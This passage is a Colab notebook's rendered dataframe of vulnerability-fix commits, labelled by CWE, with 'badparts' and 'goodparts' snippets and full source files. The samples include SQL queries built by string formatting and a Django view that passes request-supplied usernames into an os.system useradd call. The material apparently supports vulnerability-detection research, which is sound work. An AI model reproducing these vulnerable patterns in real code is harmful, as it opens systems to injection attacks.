              "      <th>31</th>\n",
              "      <td>a1f948b468b6621083a03b0d53432341b7a4d753</td>\n",
              "      <td>open</td>\n",
              "      <td>CWE-601</td>\n",
              "      <td>[\"    path = posixpath.normpath(path).lstrip('...</td>\n",
              "      <td>['    path = posixpath.normpath(path)', \"    p...</td>\n",
              "      <td>\\n\"\"\" Views and functions for serving static f...</td>\n",
              "      <td>\"\"\"\\nViews and functions for serving static fi...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>32</th>\n",
              "      <td>a1f948b468b6621083a03b0d53432341b7a4d753</td>\n",
              "      <td>open</td>\n",
              "      <td>CWE-601</td>\n",
              "      <td>['from django.utils._os import safe_join']</td>\n",
              "      <td>['    HttpResponseRedirect,']</td>\n",
              "      <td>\\n\"\"\" Views and functions for serving static f...</td>\n",
              "      <td>\"\"\"\\nViews and functions for serving static fi...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>33</th>\n",
              "      <td>a1f948b468b6621083a03b0d53432341b7a4d753</td>\n",
              "      <td>open</td>\n",
              "      <td>CWE-601</td>\n",
              "      <td>[\"    path = posixpath.normpath(path).lstrip('...</td>\n",
              "      <td>['    path = posixpath.normpath(path)', \"    p...</td>\n",
              "      <td>\\n\"\"\" Views and functions for serving static f...</td>\n",
              "      <td>\"\"\"\\nViews and functions for serving static fi...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>34</th>\n",
              "      <td>a1f948b468b6621083a03b0d53432341b7a4d753</td>\n",
              "      <td>open</td>\n",
              "      <td>CWE-601</td>\n",
              "      <td>['from django.utils._os import safe_join']</td>\n",
              "      <td>['    HttpResponseRedirect,']</td>\n",
              "      <td>\\n\"\"\" Views and functions for serving static f...</td>\n",
              "      <td>\"\"\"\\nViews and functions for serving static fi...</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>\n",
              "    <div class=\"colab-df-buttons\">\n",
              "\n",
              "  <div class=\"colab-df-container\">\n",
              "    <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-95400f9a-6f2d-40ca-98c3-f718f8014391')\"\n",
              "            title=\"Convert this dataframe to an interactive table.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\" viewBox=\"0 -960 960 960\">\n",
              "    <path d=\"M120-120v-720h720v720H120Zm60-500h600v-160H180v160Zm220 220h160v-160H400v160Zm0 220h160v-160H400v160ZM180-400h160v-160H180v160Zm440 0h160v-160H620v160ZM180-180h160v-160H180v160Zm440 0h160v-160H620v160Z\"/>\n",
              "  </svg>\n",
              "    </button>\n",
              "\n",
              "  <style>\n",
              "    .colab-df-container {\n",
              "      display:flex;\n",
              "      gap: 12px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert {\n",
              "      background-color: #E8F0FE;\n",
              "      border: none;\n",
              "      border-radius: 50%;\n",
              "      cursor: pointer;\n",
              "      display: none;\n",
              "      fill: #1967D2;\n",
              "      height: 32px;\n",
              "      padding: 0 0 0 0;\n",
              "      width: 32px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert:hover {\n",
              "      background-color: #E2EBFA;\n",
              "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "      fill: #174EA6;\n",
              "    }\n",
              "\n",
              "    .colab-df-buttons div {\n",
              "      margin-bottom: 4px;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert {\n",
              "      background-color: #3B4455;\n",
              "      fill: #D2E3FC;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert:hover {\n",
              "      background-color: #434B5C;\n",
              "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "      fill: #FFFFFF;\n",
              "    }\n",
              "  </style>\n",
              "\n",
              "    <script>\n",
              "      const buttonEl =\n",
              "        document.querySelector('#df-95400f9a-6f2d-40ca-98c3-f718f8014391 button.colab-df-convert');\n",
              "      buttonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "      async function convertToInteractive(key) {\n",
              "        const element = document.querySelector('#df-95400f9a-6f2d-40ca-98c3-f718f8014391');\n",
              "        const dataTable =\n",
              "          await google.colab.kernel.invokeFunction('convertToInteractive',\n",
              "                                                    [key], {});\n",
              "        if (!dataTable) return;\n",
              "\n",
              "        const docLinkHtml = 'Like what you see? Visit the ' +\n",
              "          '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
              "          + ' to learn more about interactive tables.';\n",
              "        element.innerHTML = '';\n",
              "        dataTable['output_type'] = 'display_data';\n",
              "        await google.colab.output.renderOutput(dataTable, element);\n",
              "        const docLink = document.createElement('div');\n",
              "        docLink.innerHTML = docLinkHtml;\n",
              "        element.appendChild(docLink);\n",
              "      }\n",
              "    </script>\n",
              "  </div>\n",
              "\n",
              "\n",
              "    <div id=\"df-4605436c-bfee-4075-95bb-63df0d624d67\">\n",
              "      <button class=\"colab-df-quickchart\" onclick=\"quickchart('df-4605436c-bfee-4075-95bb-63df0d624d67')\"\n",
              "                title=\"Suggest charts\"\n",
              "                style=\"display:none;\">\n",
              "\n",
              "<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "     width=\"24px\">\n",
              "    <g>\n",
              "        <path d=\"M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z\"/>\n",
              "    </g>\n",
              "</svg>\n",
              "      </button>\n",
              "\n",
              "<style>\n",
              "  .colab-df-quickchart {\n",
              "      --bg-color: #E8F0FE;\n",
              "      --fill-color: #1967D2;\n",
              "      --hover-bg-color: #E2EBFA;\n",
              "      --hover-fill-color: #174EA6;\n",
              "      --disabled-fill-color: #AAA;\n",
              "      --disabled-bg-color: #DDD;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart {\n",
              "      --bg-color: #3B4455;\n",
              "      --fill-color: #D2E3FC;\n",
              "      --hover-bg-color: #434B5C;\n",
              "      --hover-fill-color: #FFFFFF;\n",
              "      --disabled-bg-color: #3B4455;\n",
              "      --disabled-fill-color: #666;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart {\n",
              "    background-color: var(--bg-color);\n",
              "    border: none;\n",
              "    border-radius: 50%;\n",
              "    cursor: pointer;\n",
              "    display: none;\n",
              "    fill: var(--fill-color);\n",
              "    height: 32px;\n",
              "    padding: 0;\n",
              "    width: 32px;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart:hover {\n",
              "    background-color: var(--hover-bg-color);\n",
              "    box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "    fill: var(--button-hover-fill-color);\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart-complete:disabled,\n",
              "  .colab-df-quickchart-complete:disabled:hover {\n",
              "    background-color: var(--disabled-bg-color);\n",
              "    fill: var(--disabled-fill-color);\n",
              "    box-shadow: none;\n",
              "  }\n",
              "\n",
              "  .colab-df-spinner {\n",
              "    border: 2px solid var(--fill-color);\n",
              "    border-color: transparent;\n",
              "    border-bottom-color: var(--fill-color);\n",
              "    animation:\n",
              "      spin 1s steps(1) infinite;\n",
              "  }\n",
              "\n",
              "  @keyframes spin {\n",
              "    0% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "      border-left-color: var(--fill-color);\n",
              "    }\n",
              "    20% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    30% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    40% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    60% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    80% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "    90% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "  }\n",
              "</style>\n",
              "\n",
              "      <script>\n",
              "        async function quickchart(key) {\n",
              "          const quickchartButtonEl =\n",
              "            document.querySelector('#' + key + ' button');\n",
              "          quickchartButtonEl.disabled = true;  // To prevent multiple clicks.\n",
              "          quickchartButtonEl.classList.add('colab-df-spinner');\n",
              "          try {\n",
              "            const charts = await google.colab.kernel.invokeFunction(\n",
              "                'suggestCharts', [key], {});\n",
              "          } catch (error) {\n",
              "            console.error('Error during call to suggestCharts:', error);\n",
              "          }\n",
              "          quickchartButtonEl.classList.remove('colab-df-spinner');\n",
              "          quickchartButtonEl.classList.add('colab-df-quickchart-complete');\n",
              "        }\n",
              "        (() => {\n",
              "          let quickchartButtonEl =\n",
              "            document.querySelector('#df-4605436c-bfee-4075-95bb-63df0d624d67 button');\n",
              "          quickchartButtonEl.style.display =\n",
              "            google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "        })();\n",
              "      </script>\n",
              "    </div>\n",
              "\n",
              "  <div id=\"id_3e59128f-b43b-40e0-a94c-1029948f2974\">\n",
              "    <style>\n",
              "      .colab-df-generate {\n",
              "        background-color: #E8F0FE;\n",
              "        border: none;\n",
              "        border-radius: 50%;\n",
              "        cursor: pointer;\n",
              "        display: none;\n",
              "        fill: #1967D2;\n",
              "        height: 32px;\n",
              "        padding: 0 0 0 0;\n",
              "        width: 32px;\n",
              "      }\n",
              "\n",
              "      .colab-df-generate:hover {\n",
              "        background-color: #E2EBFA;\n",
              "        box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "        fill: #174EA6;\n",
              "      }\n",
              "\n",
              "      [theme=dark] .colab-df-generate {\n",
              "        background-color: #3B4455;\n",
              "        fill: #D2E3FC;\n",
              "      }\n",
              "\n",
              "      [theme=dark] .colab-df-generate:hover {\n",
              "        background-color: #434B5C;\n",
              "        box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "        filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "        fill: #FFFFFF;\n",
              "      }\n",
              "    </style>\n",
              "    <button class=\"colab-df-generate\" onclick=\"generateWithVariable('df_sample')\"\n",
              "            title=\"Generate code using this dataframe.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "       width=\"24px\">\n",
              "    <path d=\"M7,19H8.4L18.45,9,17,7.55,7,17.6ZM5,21V16.75L18.45,3.32a2,2,0,0,1,2.83,0l1.4,1.43a1.91,1.91,0,0,1,.58,1.4,1.91,1.91,0,0,1-.58,1.4L9.25,21ZM18.45,9,17,7.55Zm-12,3A5.31,5.31,0,0,0,4.9,8.1,5.31,5.31,0,0,0,1,6.5,5.31,5.31,0,0,0,4.9,4.9,5.31,5.31,0,0,0,6.5,1,5.31,5.31,0,0,0,8.1,4.9,5.31,5.31,0,0,0,12,6.5,5.46,5.46,0,0,0,6.5,12Z\"/>\n",
              "  </svg>\n",
              "    </button>\n",
              "    <script>\n",
              "      (() => {\n",
              "      const buttonEl =\n",
              "        document.querySelector('#id_3e59128f-b43b-40e0-a94c-1029948f2974 button.colab-df-generate');\n",
              "      buttonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "      buttonEl.onclick = () => {\n",
              "        google.colab.notebook.generateWithVariable('df_sample');\n",
              "      }\n",
              "      })();\n",
              "    </script>\n",
              "  </div>\n",
              "\n",
              "    </div>\n",
              "  </div>\n"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "dataframe",
              "variable_name": "df_sample",
              "summary": "{\n  \"name\": \"df_sample\",\n  \"rows\": 35,\n  \"fields\": [\n    {\n      \"column\": \"sha\",\n      \"properties\": {\n        \"dtype\": \"category\",\n        \"num_unique_values\": 17,\n        \"samples\": [\n          \"9b7805119938343fcac9dc929d8882f1d97cf14a\",\n          \"269b8c87afc149911af3ae63b3ccbfc77ffb223d\",\n          \"66d3662986469f543f95324aaf2868465de2bd24\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"keyword\",\n      \"properties\": {\n        \"dtype\": \"category\",\n        \"num_unique_values\": 7,\n        \"samples\": [\n          \"remote\",\n          \"path\",\n          \"XSRF\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"CWE\",\n      \"properties\": {\n        \"dtype\": \"category\",\n        \"num_unique_values\": 7,\n        \"samples\": [\n          \"CWE-94\",\n          \"CWE-538\",\n          \"CWE-352\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"goodparts\",\n      \"properties\": {\n        \"dtype\": \"string\",\n        \"num_unique_values\": 24,\n        \"samples\": [\n          \"['        sql = \\\"select * from users where id = :user_id and projects_mapped @> \\\\'{{:project_id}}\\\\'\\\"', '        result = db.engine.execute(text(sql), user_id=user_id, project_id=project_id)', '                    set projects_mapped = array_append(projects_mapped, :project_id)', \\\"                  where id = :user_id'''\\\", '        db.engine.execute(text(sql), project_id=project_id, user_id=user_id)']\",\n          \"[\\\"        if 'application/json' or 'text/plain' in res_headers['Content-Type']:\\\"]\",\n          \"['import common, sqlite3, subprocess, NetworkManager, crypt, pwd, getpass, spwd']\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"badparts\",\n      \"properties\": {\n        \"dtype\": \"string\",\n        \"num_unique_values\": 24,\n        \"samples\": [\n          \"['        sql = \\\"select * from users where id = {0} and projects_mapped @> \\\\'{{{1}}}\\\\'\\\".format(user_id, project_id)', '        result = db.engine.execute(sql)', '                    set projects_mapped = array_append(projects_mapped, {0})', \\\"                  where id = {1}'''.format(project_id, user_id)\\\", '        db.engine.execute(sql)']\",\n          \"[\\\"        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\\\"]\",\n          \"['import common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd ']\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"source\",\n      \"properties\": {\n        \"dtype\": \"category\",\n        \"num_unique_values\": 16,\n        \"samples\": [\n          \"\\nfrom django.shortcuts import render from django.http import HttpResponse, JsonResponse from django.views.decorators.csrf import csrf_exempt from rest_framework.renderers import JSONRenderer from rest_framework.parsers import JSONParser from rest_framework.response import Response from rest_framework import viewsets from rest_framework.decorators import list_route from flask import escape from.models import BoxDetails, RegisteredServices from.serializers import BoxDetailsSerializer, RegisteredServicesSerializer import common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd nm=NetworkManager.NetworkManager wlans=[d for d in nm.Devices if isinstance(d, NetworkManager.Wireless)] def get_osversion(): \\\"\\\"\\\" PRETTY_NAME of your Titania os(in lowercase). \\\"\\\"\\\" with open(\\\"/etc/os-release\\\") as f: osfilecontent=f.read().split(\\\"\\\\n\\\") version=osfilecontent[4].split('=')[1].strip('\\\\\\\"') return version def get_allconfiguredwifi(): \\\"\\\"\\\" nmcli con | grep 802-11-wireless \\\"\\\"\\\" ps=subprocess.Popen('nmcli -t -f NAME,TYPE conn | grep 802-11-wireless', shell=True,stdout=subprocess.PIPE).communicate()[0] wifirows=ps.split('\\\\n') wifi=[] for row in wifirows: name=row.split(':') print(name) wifi.append(name[0]) return wifi def get_allAPs(): \\\"\\\"\\\" nmcli con | grep 802-11-wireless \\\"\\\"\\\" ps=subprocess.Popen('nmcli -t -f SSID,BARS device wifi list', shell=True,stdout=subprocess.PIPE).communicate()[0] wifirows=ps.split('\\\\n') wifi=[] for row in wifirows: entry=row.split(':') print(entry) wifi.append(entry) return wifi def add_user(username, password): encPass=crypt.crypt(password,\\\"22\\\") os.system(\\\"useradd -G docker,wheel -p \\\"+encPass+\\\" \\\"+username) def add_newWifiConn(wifiname, wifipass): print(wlans) wlan0=wlans[0] print(wlan0) print(wifiname) for dev in wlans: for ap in dev.AccessPoints: if ap.Ssid==wifiname: currentwifi=ap print(currentwifi) params={ \\\"802-11-wireless\\\":{ \\\"security\\\": \\\"802-11-wireless-security\\\", }, \\\"802-11-wireless-security\\\":{ \\\"key-mgmt\\\": \\\"wpa-psk\\\", \\\"psk\\\": wifipass }, } conn=nm.AddAndActivateConnection(params, wlan0, currentwifi) def delete_WifiConn(wifiap): \\\"\\\"\\\" nmcli connection delete id <connection name> \\\"\\\"\\\" ps=subprocess.Popen(['nmcli', 'connection','delete','id',wifiap], stdout=subprocess.PIPE) print(ps) def edit_WifiConn(wifiname, wifipass): ps=subprocess.Popen(['nmcli', 'connection','delete','id',wifiname], stdout=subprocess.PIPE) print(ps) print(wlans) wlan0=wlans[0] print(wlan0) print(wifiname) for dev in wlans: for ap in dev.AccessPoints: if ap.Ssid==wifiname: currentwifi=ap params={ \\\"802-11-wireless\\\":{ \\\"security\\\": \\\"802-11-wireless-security\\\", }, \\\"802-11-wireless-security\\\":{ \\\"key-mgmt\\\": \\\"wpa-psk\\\", \\\"psk\\\": wifipass }, } conn=nm.AddAndActivateConnection(params, wlan0, currentwifi) return @csrf_exempt def handle_config(request): \\\"\\\"\\\" List all code snippets, or create a new snippet. \\\"\\\"\\\" if request.method=='POST': action=request.POST.get(\\\"_action\\\") print(action) if action=='registerService': request_name=request.POST.get(\\\"name\\\") request_address=request.POST.get(\\\"address\\\") request_icon=request.POST.get(\\\"icon\\\") print(request_name) print(request_address) print(request_icon) setServiceDetails=RegisteredServices.objects.get_or_create(name=request_name,address=request_address,icon=request_icon) return JsonResponse({\\\"STATUS\\\":\\\"SUCCESS\\\"}, safe=False) elif action=='getSchema': schema=get_osversion() return JsonResponse({\\\"version_info\\\":schema}, safe=False) elif action=='getIfConfigured': print(action) queryset=BoxDetails.objects.all() serializer=BoxDetailsSerializer(queryset, many=True) return JsonResponse(serializer.data, safe=False) elif action=='loadDependencies': print(action) queryset=RegisteredServices.objects.all() serializer=RegisteredServicesSerializer(queryset, many=True) return JsonResponse(serializer.data, safe=False) elif action=='getAllAPs': wifi_aps=get_allAPs() return JsonResponse(wifi_aps, safe=False) elif action=='saveUserDetails': print(action) boxname=escape(request.POST.get(\\\"boxname\\\")) username=escape(request.POST.get(\\\"username\\\")) password=escape(request.POST.get(\\\"password\\\")) print(username) add_user(username,password) setBoxName=BoxDetails(boxname=boxname) setBoxName.save() wifi_pass=request.POST.get(\\\"wifi_password\\\") wifi_name=request.POST.get(\\\"wifi_ap\\\") if len(wifi_name) > 0: add_newWifiConn(wifi_name,wifi_pass) return JsonResponse({\\\"STATUS\\\":\\\"SUCCESS\\\"}, safe=False) elif action=='login': print(action) username=escape(request.POST.get(\\\"username\\\")) password=escape(request.POST.get(\\\"password\\\")) output='' \\\"\\\"\\\"Tries to authenticate a user. Returns True if the authentication succeeds, else the reason (string) is returned.\\\"\\\"\\\" try: enc_pwd=spwd.getspnam(username)[1] if enc_pwd in[\\\"NP\\\", \\\"!\\\", \\\"\\\", None]: output=\\\"User '%s' has no password set\\\" % username if enc_pwd in[\\\"LK\\\", \\\"*\\\"]: output=\\\"account is locked\\\" if enc_pwd==\\\"!!\\\": output=\\\"password has expired\\\" if crypt.crypt(password, enc_pwd)==enc_pwd: output='' else: output=\\\"incorrect password\\\" except KeyError: output=\\\"User '%s' not found\\\" % username if len(output)==0: return JsonResponse({\\\"username\\\":username}, safe=False) else: return JsonResponse(output, safe=False) elif action=='logout': print(action) username=request.POST.get(\\\"username\\\") print(username+' ') queryset=User.objects.all().first() if username==queryset.username: return JsonResponse({\\\"STATUS\\\":\\\"SUCCESS\\\", \\\"username\\\":queryset.username}, safe=False) elif action=='getDashboardCards': print(action) con=sqlite3.connect(\\\"dashboard.sqlite3\\\") cursor=con.cursor() cursor.execute(common.Q_DASHBOARD_CARDS) rows=cursor.fetchall() print(rows) return JsonResponse(rows, safe=False) elif action=='getDashboardChart': print(action) con=sqlite3.connect(\\\"dashboard.sqlite3\\\") cursor=con.cursor() cursor.execute(common.Q_GET_CONTAINER_ID) rows=cursor.fetchall() print(rows) finalset=[] for row in rows: cursor.execute(common.Q_GET_DASHBOARD_CHART,[row[0],]) datasets=cursor.fetchall() print(datasets) data={'container_name': row[1], 'data': datasets} finalset.append(data) return JsonResponse(finalset, safe=False) elif action=='getDockerOverview': print(action) con=sqlite3.connect(\\\"dashboard.sqlite3\\\") cursor=con.cursor() cursor.execute(common.Q_GET_DOCKER_OVERVIEW) rows=cursor.fetchall() print(rows) finalset=[] for row in rows: data={'state': row[0], 'container_id': row[1], 'name': row[2], 'image': row[3], 'running_for': row[4], 'command': row[5], 'ports': row[6], 'status': row[7], 'networks': row[8]} finalset.append(data) return JsonResponse(finalset, safe=False) elif action=='getContainerStats': print(action) con=sqlite3.connect(\\\"dashboard.sqlite3\\\") cursor=con.cursor() cursor.execute(common.Q_GET_CONTAINER_ID) rows=cursor.fetchall() print(rows) finalset=[] datasets_io=[] datasets_mem=[] datasets_perc=[] for row in rows: datasets_io=[] datasets_mem=[] datasets_perc=[] for iter in range(0,2): cursor.execute(common.Q_GET_CONTAINER_STATS_CPU,[row[0],iter+1]) counter_val=cursor.fetchall() datasets_perc.append(counter_val) for iter in range(2,4): cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1]) counter_val=cursor.fetchall() datasets_mem.append(counter_val) for iter in range(4,8): cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1]) counter_val=cursor.fetchall() datasets_io.append(counter_val) data={'container_id': row[0], 'container_name': row[1], 'data_io': datasets_io, 'data_mem': datasets_mem, 'data_perc': datasets_perc} finalset.append(data) return JsonResponse(finalset, safe=False) elif action=='getThreads': print(action) rows=[] ps=subprocess.Popen(['top', '-b','-n','1'], stdout=subprocess.PIPE).communicate()[0] processes=ps.decode().split('\\\\n') nfields=len(processes[0].split()) -1 for row in processes[4:]: rows.append(row.split(None, nfields)) return JsonResponse(rows, safe=False) elif action=='getContainerTop': print(action) con=sqlite3.connect(\\\"dashboard.sqlite3\\\") cursor=con.cursor() cursor.execute(common.Q_GET_CONTAINER_ID) rows=cursor.fetchall() resultset=[] for i in rows: data={} datasets=[] ps=subprocess.Popen(['docker', 'top',i[0]], stdout=subprocess.PIPE).communicate()[0] processes=ps.decode().split('\\\\n') nfields=len(processes[0].split()) -1 for p in processes[1:]: datasets.append(p.split(None, nfields)) data={'container_id': i[0], 'container_name': i[1], 'data': datasets} resultset.append(data) return JsonResponse(resultset, safe=False) elif action=='getSettings': print(action) ps=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0] userlist=ps.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps}], safe=False) elif action=='deleteUser': print(action) username=escape(request.POST.get(\\\"user\\\")) ps=subprocess.Popen(['userdel', username], stdout=subprocess.PIPE).communicate() fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deleteuser', 'endpoint': username}], safe=False) elif action=='addNewUser': print(action) username=escape(request.POST.get(\\\"username\\\")) password=escape(request.POST.get(\\\"password\\\")) add_user(username,password) fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'adduser', 'endpoint': username}], safe=False) elif action=='addWifi': print(action) wifi_pass=escape(request.POST.get(\\\"wifi_password\\\")) wifi_name=request.POST.get(\\\"wifi_ap\\\") if len(wifi_name) > 0: add_newWifiConn(wifi_name,wifi_pass) fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'addwifi', 'endpoint': wifi_name}], safe=False) elif action=='deleteWifi': print(action) wifi_name=request.POST.get(\\\"wifi\\\") delete_WifiConn(wifi_name) fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deletewifi', 'endpoint': wifi_name}], safe=False) elif action=='editWifi': print(action) wifi_name=request.POST.get(\\\"wifi_ap\\\") wifi_pass=escape(request.POST.get(\\\"wifi_password\\\")) edit_WifiConn(wifi_name,wifi_pass) fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'editwifi', 'endpoint': wifi_name}], safe=False) return JsonResponse(serializer.errors, status=400) def index(request): return render(request, 'index.html') class BoxDetailsViewSet(viewsets.ModelViewSet): queryset=BoxDetails.objects.all() serializer_class=BoxDetailsSerializer class RegisteredServicesViewSet(viewsets.ModelViewSet): queryset=RegisteredServices.objects.all() serializer_class=RegisteredServicesSerializer \",\n          \"\\n\\nfrom libtmux import Server from yaml import load, dump from setupParser import Loader from DepTree import Node, dep_resolve, CircularReferenceException import logging import os import socket import argparse from psutil import Process from subprocess import call from graphviz import Digraph from enum import Enum from time import sleep import sys from PyQt4 import QtGui import hyperGUI FORMAT=\\\"%(asctime)s: %(name)s[%(levelname)s]:\\\\t%(message)s\\\" logging.basicConfig(level=logging.WARNING, format=FORMAT, datefmt='%I:%M:%S') TMP_SLAVE_DIR=\\\"/tmp/Hyperion/slave/components\\\" TMP_COMP_DIR=\\\"/tmp/Hyperion/components\\\" TMP_LOG_PATH=\\\"/tmp/Hyperion/log\\\" BASE_DIR=os.path.dirname(__file__) SCRIPT_CLONE_PATH=(\\\"%s/scripts/start_named_clone_session.sh\\\" % BASE_DIR) class CheckState(Enum): RUNNING=0 STOPPED=1 STOPPED_BUT_SUCCESSFUL=2 STARTED_BY_HAND=3 DEP_FAILED=4 class ControlCenter: def __init__(self, configfile=None): self.logger=logging.getLogger(__name__) self.logger.setLevel(logging.DEBUG) self.configfile=configfile self.nodes={} self.server=[] self.host_list=[] if configfile: self.load_config(configfile) self.session_name=self.config[\\\"name\\\"] with open('debug-result.yml', 'w') as outfile: dump(self.config, outfile, default_flow_style=False) self.logger.debug(\\\"Loading config was successful\\\") self.server=Server() if self.server.has_session(self.session_name): self.session=self.server.find_where({ \\\"session_name\\\": self.session_name }) self.logger.info('found running session by name \\\"%s\\\" on server' % self.session_name) else: self.logger.info('starting new session by name \\\"%s\\\" on server' % self.session_name) self.session=self.server.new_session( session_name=self.session_name, window_name=\\\"Main\\\" ) else: self.config=None def load_config(self, filename=\\\"default.yaml\\\"): with open(filename) as data_file: self.config=load(data_file, Loader) def init(self): if not self.config: self.logger.error(\\\" Config not loaded yet!\\\") else: for group in self.config['groups']: for comp in group['components']: self.logger.debug(\\\"Checking component '%s' in group '%s' on host '%s'\\\" % (comp['name'], group['name'], comp['host'])) if comp['host'] !=\\\"localhost\\\" and not self.run_on_localhost(comp): self.copy_component_to_remote(comp, comp['name'], comp['host']) self.host_list=list(set(self.host_list)) self.set_dependencies(True) def set_dependencies(self, exit_on_fail): for group in self.config['groups']: for comp in group['components']: self.nodes[comp['name']]=Node(comp) master_node=Node({'name': 'master_node'}) for name in self.nodes: node=self.nodes.get(name) master_node.addEdge(node) if \\\"depends\\\" in node.component: for dep in node.component['depends']: if dep in self.nodes: node.addEdge(self.nodes[dep]) else: self.logger.error(\\\"Unmet dependency: '%s' for component '%s'!\\\" %(dep, node.comp_name)) if exit_on_fail: exit(1) self.nodes['master_node']=master_node try: node=self.nodes.get('master_node') res=[] unres=[] dep_resolve(node, res, unres) dep_string=\\\"\\\" for node in res: if node is not master_node: dep_string=\\\"%s -> %s\\\" %(dep_string, node.comp_name) self.logger.debug(\\\"Dependency tree for start all: %s\\\" % dep_string) except CircularReferenceException as ex: self.logger.error(\\\"Detected circular dependency reference between %s and %s!\\\" %(ex.node1, ex.node2)) if exit_on_fail: exit(1) def copy_component_to_remote(self, infile, comp, host): 